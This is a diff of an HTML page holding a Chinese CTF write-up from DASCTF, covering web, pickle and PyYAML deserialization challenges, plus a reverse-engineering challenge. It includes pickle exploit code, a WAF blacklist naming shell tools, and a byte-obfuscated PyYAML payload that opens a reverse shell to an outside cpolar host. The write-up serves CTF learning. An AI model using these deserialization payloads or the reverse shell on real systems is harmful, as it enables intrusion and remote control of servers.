@@ -315,86 +315,84 @@ Okay, let&#39;s do this. Following Tera&#39;s format, we can leak the session wi
 <p>发现一共三个路由， &#x2F;src、&#x2F;ppicklee 和 &#x2F;admin  </p>
 <p>进入&#x2F;admin 路由中提示没有权限，以为是要通过更改SESSID获取管理员权限，来得到flag<br>但是这道题三个路由中都没有Cooike，无法成功 </p>
 <p>再读源码，发现可以&#x2F;ppicklee 路由中存在防火墙，所以绕过防火墙，看看能否从 &#x2F;ppicklee 路由中得到什么<br>使用</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"># 使用 subprocess 来绕过</span><br><span class="line">class Exploit:</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (getattr, (&#x27;subprocess&#x27;, &#x27;Popen&#x27;, (&#x27;cat /flag&#x27;,)))</span><br><span class="line"></span><br><span class="line"># 创建恶意对象</span><br><span class="line">exploit_obj = Exploit()</span><br><span class="line"></span><br><span class="line"># 将恶意对象序列化为 pickle 数据</span><br><span class="line">pickled_data = pickle.dumps(exploit_obj)</span><br><span class="line"></span><br><span class="line"># 编码为 base64</span><br><span class="line">encoded_data = base64.b64encode(pickled_data).decode()</span><br><span class="line"></span><br><span class="line">print(encoded_data)</span><br><span class="line">```  </span><br><span class="line">使用POSTman传参，发现只能得到 success pickle </span><br><span class="line">无法得到flag，遂放弃  </span><br><span class="line"></span><br><span class="line">后由WP可知，因为 src 路由会读取 app.py 内容并输出，所以可以尝试先读取flag，再把flag的内容写入到 app.py  </span><br><span class="line"></span><br><span class="line">可以使用pker：</span><br><span class="line"></span><br><span class="line">&gt; [Pker](https://github.com/eddieivan01/pker)  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>getattr &#x3D; GLOBAL(‘builtins’, ‘getattr’)</p>
-<p>open &#x3D; GLOBAL(‘builtins’, ‘open’)<br>flag&#x3D;open(‘&#x2F;flag’)<br>read&#x3D;getattr(flag, ‘read’)<br>f&#x3D;open(‘.&#x2F;app.py’,’w’)<br>write&#x3D;getattr(f, ‘write’)<br>fff&#x3D;read()<br>write(fff)<br>return  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在 ppicklee 路由中传参，然后在 src 路由中得到flag  </span><br><span class="line"></span><br><span class="line">这道题涉及pickle反序列化，在这里粘一个pickle反序列化相关的博客</span><br><span class="line"></span><br><span class="line">&gt; [Pickle反序列化初探](https://hachp1.github.io/posts/Web%E5%AE%89%E5%85%A8/20200328-pickle.html)  </span><br><span class="line"></span><br><span class="line">## yaml_matser  </span><br><span class="line">源码： </span><br></pre></td></tr></table></figure>
-<p>import os<br>import re<br>import yaml<br>from flask import Flask, request, jsonify, render_template</p>
-<p>app &#x3D; Flask(<strong>name</strong>, template_folder&#x3D;’templates’)</p>
-<p>UPLOAD_FOLDER &#x3D; ‘uploads’<br>os.makedirs(UPLOAD_FOLDER, exist_ok&#x3D;True)<br>def waf(input_str):</p>
-<pre><code>blacklist_terms = &#123;&#39;apply&#39;, &#39;subprocess&#39;,&#39;os&#39;,&#39;map&#39;, &#39;system&#39;, &#39;popen&#39;, &#39;eval&#39;, &#39;sleep&#39;, &#39;setstate&#39;,
-                   &#39;command&#39;,&#39;static&#39;,&#39;templates&#39;,&#39;session&#39;,&#39;&amp;&#39;,&#39;globals&#39;,&#39;builtins&#39;
-                   &#39;run&#39;, &#39;ntimeit&#39;, &#39;bash&#39;, &#39;zsh&#39;, &#39;sh&#39;, &#39;curl&#39;, &#39;nc&#39;, &#39;env&#39;, &#39;before_request&#39;, &#39;after_request&#39;,
-                   &#39;error_handler&#39;, &#39;add_url_rule&#39;,&#39;teardown_request&#39;,&#39;teardown_appcontext&#39;,&#39;\\u&#39;,&#39;\\x&#39;,&#39;+&#39;,&#39;base64&#39;,&#39;join&#39;&#125;
+<pre><code>import pickle
+import base64
 
-input_str_lower = str(input_str).lower()
+# 使用 subprocess 来绕过
+class Exploit:
+def __reduce__(self):
+    return (getattr, (&#39;subprocess&#39;, &#39;Popen&#39;, (&#39;cat /flag&#39;,)))
 
+# 创建恶意对象
+exploit_obj = Exploit()
 
-for term in blacklist_terms:
-    if term in input_str_lower:
-        print(f&quot;Found blacklisted term: &#123;term&#125;&quot;)
-        return True
-return False
+# 将恶意对象序列化为 pickle 数据
+pickled_data = pickle.dumps(exploit_obj)
+
+# 编码为 base64
+encoded_data = base64.b64encode(pickled_data).decode()
+
+print(encoded_data)
 </code></pre>
-<p>file_pattern &#x3D; re.compile(r’.*.yaml$’)</p>
-<p>def is_yaml_file(filename):<br>    return bool(file_pattern.match(filename))</p>
-<p>@app.route(‘&#x2F;‘)<br>def index():<br>    return ‘’’<br>    Welcome to DASCTF X 0psu3<br>    <br><br>    Here is the challenge <a href="/upload">Upload file</a><br>    <br><br>    Enjoy it <a href="/Yam1">Yam1</a><br>    ‘’’</p>
-<p>@app.route(‘&#x2F;upload’, methods&#x3D;[‘GET’, ‘POST’])<br>def upload_file():<br>    if request.method &#x3D;&#x3D; ‘POST’:<br>        try:<br>            uploaded_file &#x3D; request.files[‘file’]</p>
-<pre><code>        if uploaded_file and is_yaml_file(uploaded_file.filename):
-            file_path = os.path.join(UPLOAD_FOLDER, uploaded_file.filename)
-            uploaded_file.save(file_path)
+<p>使用POSTman传参，发现只能得到 success pickle<br>无法得到flag，遂放弃  </p>
+<p>后由WP可知，因为 src 路由会读取 app.py 内容并输出，所以可以尝试先读取flag，再把flag的内容写入到 app.py  </p>
+<p>可以使用pker：</p>
+<blockquote>
+<p><a href="https://github.com/eddieivan01/pker">Pker</a>  </p>
+</blockquote>
+<pre><code>getattr = GLOBAL(&#39;builtins&#39;, &#39;getattr&#39;)
 
-            return jsonify(&#123;&quot;message&quot;: &quot;uploaded successfully&quot;&#125;), 200
-        else:
-            return jsonify(&#123;&quot;error&quot;: &quot;Just YAML file&quot;&#125;), 400
-
-    except Exception as e:
-        return jsonify(&#123;&quot;error&quot;: str(e)&#125;), 500
-
-
-return render_template(&#39;upload.html&#39;)
+open = GLOBAL(&#39;builtins&#39;, &#39;open&#39;)
+flag=open(&#39;/flag&#39;)
+read=getattr(flag, &#39;read&#39;)
+f=open(&#39;./app.py&#39;,&#39;w&#39;)
+write=getattr(f, &#39;write&#39;)
+fff=read()
+write(fff)
+return  
 </code></pre>
-<p>@app.route(‘&#x2F;Yam1’, methods&#x3D;[‘GET’, ‘POST’])<br>def Yam1():<br>    filename &#x3D; request.args.get(‘filename’,’’)<br>    if filename:<br>        with open(f’uploads&#x2F;{filename}.yaml’, ‘rb’) as f:<br>            file_content &#x3D; f.read()<br>        if not waf(file_content):<br>            test &#x3D; yaml.load(file_content)<br>            print(test)<br>    return ‘welcome’</p>
-<p>if <strong>name</strong> &#x3D;&#x3D; ‘<strong>main</strong>‘:<br>    app.run()</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">进入发现有文件上传功能，而且只能上传 .yaml 文件  </span><br><span class="line"></span><br><span class="line">一开始尝试直接输出flag，使用</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>!!python&#x2F;object:<strong>main</strong>.MyClass<br>args: !!python&#x2F;tuple</p>
-<ul>
-<li>!!python&#x2F;name:globals</li>
-<li>“os.system”</li>
-<li>“echo hello”<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无果  </span><br><span class="line"></span><br><span class="line">由WP得知这是一道pyYaml反序列化  </span><br><span class="line"></span><br><span class="line">&gt; [PyYaml反序列化漏洞详解](https://xz.aliyun.com/t/12481?time__1311=GqGxRQqiuDyDlrzG78GODc7x9GLPQAox)  </span><br><span class="line"></span><br><span class="line">黑名单中采用了列举法来防止攻击，可以从这里入手，发现没有禁exec </span><br><span class="line"></span><br><span class="line">上传内容：</span><br></pre></td></tr></table></figure>
-!!python&#x2F;object&#x2F;new:type<br>args: [‘z’, !!python&#x2F;tuple [], {‘extend’: !!python&#x2F;name:exec }]<br>listitems: ‘<strong>import</strong>(bytes([111,115]).decode()).<strong>getattribute</strong>(bytes([115,121,115,116,101,109]).decode())(bytes([98, 97, 115, 104, 32, 45, 105, 32, 62, 38, 32, 47, 100, 101, 118, 47, 116, 99, 112, 47, 51, 49, 46, 116, 99, 112, 46, 99, 112, 111, 108, 97, 114, 46, 116, 111, 112, 32, 49, 51, 49, 57, 48, 32, 48, 62, 38, 49]<br>).decode())’</li>
-</ul>
-<p>#<strong>import</strong>(‘os’).<strong>getattribute</strong>(‘system’)(‘bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;31.tcp.cpolar.top 13190  0&gt;&amp;1’)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">建立反向shell，得到flag  </span><br><span class="line"></span><br><span class="line"># Reverse  </span><br><span class="line">## tryre  </span><br><span class="line">根据提供的代码片段，可以看到这是一个混合了 Base64 编码、异或操作和字符映射的加密验证逻辑。我们需要逆向每一步操作来编写解密脚本，以还原原始的输入字符串。</span><br><span class="line">以下是解密过程的分步解析和 Python 脚本实现:</span><br><span class="line">解密步骤解析</span><br><span class="line">1.Base64 映射表(aZyxabcdefghijk)</span><br><span class="line">自定义的 Base64 字符映射表:</span><br><span class="line"></span><br><span class="line">    ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/</span><br><span class="line"></span><br><span class="line">加密时使用了这个映射表对数据进行编码，解密时需要反向查找映射。</span><br><span class="line">2.加密数据(v21):</span><br><span class="line">加密的目标字符串为:</span><br><span class="line"></span><br><span class="line">    M@ASL3MF~uL3ICT2IhUgKSD2IeDsICH7Hd26HhQgKSOhNCX7TVL3UFMeHi2?</span><br><span class="line"></span><br><span class="line">3.Base64 编码逻辑</span><br><span class="line">数据被分为 3字节一组，经过位移和分组操作映射到 Base64 表的索引中。</span><br><span class="line">解密时需要逆向这些位移和组装操作，还原原始的字节序列。</span><br><span class="line"></span><br><span class="line">4.异或操作:</span><br><span class="line">在加密过程中，最终的 Base64 编码结果被逐字节与 2进行异或操作。</span><br><span class="line">解密时需要再次逐字节与 2 进行异或操作，恢复原始数据。</span><br><span class="line"></span><br><span class="line">验证逻辑:解密后的数据与 v21 逐字节对比，如果完全相同，则验证通过  </span><br><span class="line"></span><br><span class="line">使用如下脚本进行解码  </span><br></pre></td></tr></table></figure>
-<h1 id="自定义-Base64-字符映射表"><a href="#自定义-Base64-字符映射表" class="headerlink" title="自定义 Base64 字符映射表"></a>自定义 Base64 字符映射表</h1><p>custom_base64 &#x3D; “ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+&#x2F;“<br>reverse_base64 &#x3D; {char: idx for idx, char in enumerate(custom_base64)}</p>
-<h1 id="加密数据"><a href="#加密数据" class="headerlink" title="加密数据"></a>加密数据</h1><p>encrypted &#x3D; “M@ASL3MF&#96;uL3ICT2IhUgKSD2IeDsICH7Hd26HhQgKSQhNCX7TVL3UFMeHi2?”</p>
-<h1 id="解密：逐字节异或还原"><a href="#解密：逐字节异或还原" class="headerlink" title="解密：逐字节异或还原"></a>解密：逐字节异或还原</h1><p>def xor_decrypt(data, key&#x3D;2):<br>    return ‘’.join(chr(ord(char) ^ key) for char in data)</p>
-<h1 id="解密：Base64-自定义表解码"><a href="#解密：Base64-自定义表解码" class="headerlink" title="解密：Base64 自定义表解码"></a>解密：Base64 自定义表解码</h1><p>def custom_base64_decode(data):<br>    decoded_bytes &#x3D; []<br>    for i in range(0, len(data), 4):<br>        chunk &#x3D; data[i:i + 4]</p>
-<pre><code>    # 处理填充字符 &#39;=&#39;
-    padding = chunk.count(&#39;=&#39;)
-    chunk = chunk.replace(&#39;=&#39;, &#39;A&#39;)  # 临时替换填充字符，用于解码
+<p>在 ppicklee 路由中传参，然后在 src 路由中得到flag  </p>
+<p>这道题涉及pickle反序列化，在这里粘一个pickle反序列化相关的博客</p>
+<blockquote>
+<p><a href="https://hachp1.github.io/posts/Web%E5%AE%89%E5%85%A8/20200328-pickle.html">Pickle反序列化初探</a>  </p>
+</blockquote>
+<h2 id="yaml-matser"><a href="#yaml-matser" class="headerlink" title="yaml_matser"></a>yaml_matser</h2><p>源码： </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import yaml</span><br><span class="line">from flask import Flask, request, jsonify, render_template</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__, template_folder=&#x27;templates&#x27;)</span><br><span class="line"></span><br><span class="line">UPLOAD_FOLDER = &#x27;uploads&#x27;</span><br><span class="line">os.makedirs(UPLOAD_FOLDER, exist_ok=True)</span><br><span class="line">def waf(input_str):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    blacklist_terms = &#123;&#x27;apply&#x27;, &#x27;subprocess&#x27;,&#x27;os&#x27;,&#x27;map&#x27;, &#x27;system&#x27;, &#x27;popen&#x27;, &#x27;eval&#x27;, &#x27;sleep&#x27;, &#x27;setstate&#x27;,</span><br><span class="line">                       &#x27;command&#x27;,&#x27;static&#x27;,&#x27;templates&#x27;,&#x27;session&#x27;,&#x27;&amp;&#x27;,&#x27;globals&#x27;,&#x27;builtins&#x27;</span><br><span class="line">                       &#x27;run&#x27;, &#x27;ntimeit&#x27;, &#x27;bash&#x27;, &#x27;zsh&#x27;, &#x27;sh&#x27;, &#x27;curl&#x27;, &#x27;nc&#x27;, &#x27;env&#x27;, &#x27;before_request&#x27;, &#x27;after_request&#x27;,</span><br><span class="line">                       &#x27;error_handler&#x27;, &#x27;add_url_rule&#x27;,&#x27;teardown_request&#x27;,&#x27;teardown_appcontext&#x27;,&#x27;\\u&#x27;,&#x27;\\x&#x27;,&#x27;+&#x27;,&#x27;base64&#x27;,&#x27;join&#x27;&#125;</span><br><span class="line"></span><br><span class="line">    input_str_lower = str(input_str).lower()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    for term in blacklist_terms:</span><br><span class="line">        if term in input_str_lower:</span><br><span class="line">            print(f&quot;Found blacklisted term: &#123;term&#125;&quot;)</span><br><span class="line">            return True</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file_pattern = re.compile(r&#x27;.*\.yaml$&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def is_yaml_file(filename):</span><br><span class="line">    return bool(file_pattern.match(filename))</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return &#x27;&#x27;&#x27;</span><br><span class="line">    Welcome to DASCTF X 0psu3</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    Here is the challenge &lt;a href=&quot;/upload&quot;&gt;Upload file&lt;/a&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    Enjoy it &lt;a href=&quot;/Yam1&quot;&gt;Yam1&lt;/a&gt;</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/upload&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def upload_file():</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        try:</span><br><span class="line">            uploaded_file = request.files[&#x27;file&#x27;]</span><br><span class="line"></span><br><span class="line">            if uploaded_file and is_yaml_file(uploaded_file.filename):</span><br><span class="line">                file_path = os.path.join(UPLOAD_FOLDER, uploaded_file.filename)</span><br><span class="line">                uploaded_file.save(file_path)</span><br><span class="line"></span><br><span class="line">                return jsonify(&#123;&quot;message&quot;: &quot;uploaded successfully&quot;&#125;), 200</span><br><span class="line">            else:</span><br><span class="line">                return jsonify(&#123;&quot;error&quot;: &quot;Just YAML file&quot;&#125;), 400</span><br><span class="line"></span><br><span class="line">        except Exception as e:</span><br><span class="line">            return jsonify(&#123;&quot;error&quot;: str(e)&#125;), 500</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return render_template(&#x27;upload.html&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/Yam1&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def Yam1():</span><br><span class="line">    filename = request.args.get(&#x27;filename&#x27;,&#x27;&#x27;)</span><br><span class="line">    if filename:</span><br><span class="line">        with open(f&#x27;uploads/&#123;filename&#125;.yaml&#x27;, &#x27;rb&#x27;) as f:</span><br><span class="line">            file_content = f.read()</span><br><span class="line">        if not waf(file_content):</span><br><span class="line">            test = yaml.load(file_content)</span><br><span class="line">            print(test)</span><br><span class="line">    return &#x27;welcome&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
 
-    # 逐字节解码
-    b1 = reverse_base64[chunk[0]] &lt;&lt; 2 | reverse_base64[chunk[1]] &gt;&gt; 4
-    b2 = (reverse_base64[chunk[1]] &amp; 0xF) &lt;&lt; 4 | reverse_base64[chunk[2]] &gt;&gt; 2
-    b3 = (reverse_base64[chunk[2]] &amp; 0x3) &lt;&lt; 6 | reverse_base64[chunk[3]]
-
-    decoded_bytes.extend([b1, b2, b3])
-
-    # 根据填充字符调整解码结果
-    if padding &gt; 0:
-        decoded_bytes = decoded_bytes[:-padding]
-
-return bytes(decoded_bytes)
+<p>进入发现有文件上传功能，而且只能上传 .yaml 文件  </p>
+<p>一开始尝试直接输出flag，使用</p>
+<pre><code>!!python/object:__main__.MyClass
+args: !!python/tuple
+- !!python/name:globals
+- &quot;os.system&quot;
+- &quot;echo hello&quot;
 </code></pre>
-<h1 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h1><p>def decrypt(encrypted):<br>    # Step 1: 逐字节异或还原<br>    after_xor &#x3D; xor_decrypt(encrypted)</p>
-<pre><code># Step 2: 使用自定义 Base64 表解码
-decoded = custom_base64_decode(after_xor)
+<p>无果  </p>
+<p>由WP得知这是一道pyYaml反序列化  </p>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/12481?time__1311=GqGxRQqiuDyDlrzG78GODc7x9GLPQAox">PyYaml反序列化漏洞详解</a>  </p>
+</blockquote>
+<p>黑名单中采用了列举法来防止攻击，可以从这里入手，发现没有禁exec </p>
+<p>上传内容：</p>
+<pre><code>!!python/object/new:type
+args: [&#39;z&#39;, !!python/tuple [], &#123;&#39;extend&#39;: !!python/name:exec &#125;]
+listitems: &#39;__import__(bytes([111,115]).decode()).__getattribute__(bytes([115,121,115,116,101,109]).decode())(bytes([98, 97, 115, 104, 32, 45, 105, 32, 62, 38, 32, 47, 100, 101, 118, 47, 116, 99, 112, 47, 51, 49, 46, 116, 99, 112, 46, 99, 112, 111, 108, 97, 114, 46, 116, 111, 112, 32, 49, 51, 49, 57, 48, 32, 48, 62, 38, 49]
+).decode())&#39;
 
-return decoded.decode(&#39;utf-8&#39;)
+#__import__(&#39;os&#39;).__getattribute__(&#39;system&#39;)(&#39;bash -i &gt;&amp; /dev/tcp/31.tcp.cpolar.top 13190  0&gt;&amp;1&#39;)
 </code></pre>
-<h1 id="调用解密函数"><a href="#调用解密函数" class="headerlink" title="调用解密函数"></a>调用解密函数</h1><p>try:<br>    decrypted &#x3D; decrypt(encrypted)<br>    print(“解密结果:”, decrypted)<br>except Exception as e:<br>    print(“解密失败:”, e)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">运行得到flag </span><br><span class="line">## secret_of_inkey  </span><br><span class="line">进入发现是小游戏</span><br><span class="line"></span><br><span class="line">可以玩出flag来（bushi） </span><br><span class="line"></span><br><span class="line">在WP中看到了一个有趣的解法 ：使用pyautogui来进行自动化脚本操作。  </span><br><span class="line"></span><br><span class="line">&gt; [pyautogui（控制鼠标键盘）GitHub官方文档翻译](https://juejin.cn/post/6844904190259494926)  </span><br><span class="line"></span><br><span class="line">### Payautogui  </span><br><span class="line">payautogui是一个Python模块，可以以编程的方式控制键鼠</span><br><span class="line">使用脚本</span><br></pre></td></tr></table></figure>
+<p>建立反向shell，得到flag  </p>
+<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="tryre"><a href="#tryre" class="headerlink" title="tryre"></a>tryre</h2><p>根据提供的代码片段，可以看到这是一个混合了 Base64 编码、异或操作和字符映射的加密验证逻辑。我们需要逆向每一步操作来编写解密脚本，以还原原始的输入字符串。<br>以下是解密过程的分步解析和 Python 脚本实现:<br>解密步骤解析<br>1.Base64 映射表(aZyxabcdefghijk)<br>自定义的 Base64 字符映射表:</p>
+<pre><code>ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/
+</code></pre>
+<p>加密时使用了这个映射表对数据进行编码，解密时需要反向查找映射。<br>2.加密数据(v21):<br>加密的目标字符串为:</p>
+<pre><code>M@ASL3MF~uL3ICT2IhUgKSD2IeDsICH7Hd26HhQgKSOhNCX7TVL3UFMeHi2?
+</code></pre>
+<p>3.Base64 编码逻辑<br>数据被分为 3字节一组，经过位移和分组操作映射到 Base64 表的索引中。<br>解密时需要逆向这些位移和组装操作，还原原始的字节序列。</p>
+<p>4.异或操作:<br>在加密过程中，最终的 Base64 编码结果被逐字节与 2进行异或操作。<br>解密时需要再次逐字节与 2 进行异或操作，恢复原始数据。</p>
+<p>验证逻辑:解密后的数据与 v21 逐字节对比，如果完全相同，则验证通过  </p>
+<p>使用如下脚本进行解码  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 自定义 Base64 字符映射表</span><br><span class="line">custom_base64 = &quot;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/&quot;</span><br><span class="line">reverse_base64 = &#123;char: idx for idx, char in enumerate(custom_base64)&#125;</span><br><span class="line"></span><br><span class="line"># 加密数据</span><br><span class="line">encrypted = &quot;M@ASL3MF`uL3ICT2IhUgKSD2IeDsICH7Hd26HhQgKSQhNCX7TVL3UFMeHi2?&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 解密：逐字节异或还原</span><br><span class="line">def xor_decrypt(data, key=2):</span><br><span class="line">    return &#x27;&#x27;.join(chr(ord(char) ^ key) for char in data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 解密：Base64 自定义表解码</span><br><span class="line">def custom_base64_decode(data):</span><br><span class="line">    decoded_bytes = []</span><br><span class="line">    for i in range(0, len(data), 4):</span><br><span class="line">        chunk = data[i:i + 4]</span><br><span class="line"></span><br><span class="line">        # 处理填充字符 &#x27;=&#x27;</span><br><span class="line">        padding = chunk.count(&#x27;=&#x27;)</span><br><span class="line">        chunk = chunk.replace(&#x27;=&#x27;, &#x27;A&#x27;)  # 临时替换填充字符，用于解码</span><br><span class="line"></span><br><span class="line">        # 逐字节解码</span><br><span class="line">        b1 = reverse_base64[chunk[0]] &lt;&lt; 2 | reverse_base64[chunk[1]] &gt;&gt; 4</span><br><span class="line">        b2 = (reverse_base64[chunk[1]] &amp; 0xF) &lt;&lt; 4 | reverse_base64[chunk[2]] &gt;&gt; 2</span><br><span class="line">        b3 = (reverse_base64[chunk[2]] &amp; 0x3) &lt;&lt; 6 | reverse_base64[chunk[3]]</span><br><span class="line"></span><br><span class="line">        decoded_bytes.extend([b1, b2, b3])</span><br><span class="line"></span><br><span class="line">        # 根据填充字符调整解码结果</span><br><span class="line">        if padding &gt; 0:</span><br><span class="line">            decoded_bytes = decoded_bytes[:-padding]</span><br><span class="line"></span><br><span class="line">    return bytes(decoded_bytes)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 解密过程</span><br><span class="line">def decrypt(encrypted):</span><br><span class="line">    # Step 1: 逐字节异或还原</span><br><span class="line">    after_xor = xor_decrypt(encrypted)</span><br><span class="line"></span><br><span class="line">    # Step 2: 使用自定义 Base64 表解码</span><br><span class="line">    decoded = custom_base64_decode(after_xor)</span><br><span class="line"></span><br><span class="line">    return decoded.decode(&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 调用解密函数</span><br><span class="line">try:</span><br><span class="line">    decrypted = decrypt(encrypted)</span><br><span class="line">    print(&quot;解密结果:&quot;, decrypted)</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(&quot;解密失败:&quot;, e)</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">运行得到flag </span><br><span class="line">## secret_of_inkey  </span><br><span class="line">进入发现是小游戏</span><br><span class="line"></span><br><span class="line">可以玩出flag来（bushi） </span><br><span class="line"></span><br><span class="line">在WP中看到了一个有趣的解法 ：使用pyautogui来进行自动化脚本操作。  </span><br><span class="line"></span><br><span class="line">&gt; [pyautogui（控制鼠标键盘）GitHub官方文档翻译](https://juejin.cn/post/6844904190259494926)  </span><br><span class="line"></span><br><span class="line">### Payautogui  </span><br><span class="line">payautogui是一个Python模块，可以以编程的方式控制键鼠</span><br><span class="line">使用脚本</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>import pyautogui<br>import time<br>from pywinauto.application import Application</p>
 <p>print(“脚本将在3秒后开始运行…”)<br>time.sleep(3)</p>
 <p>start_x, start_y, end_x, end_y &#x3D; 900, 210, 2080, 1390</p>
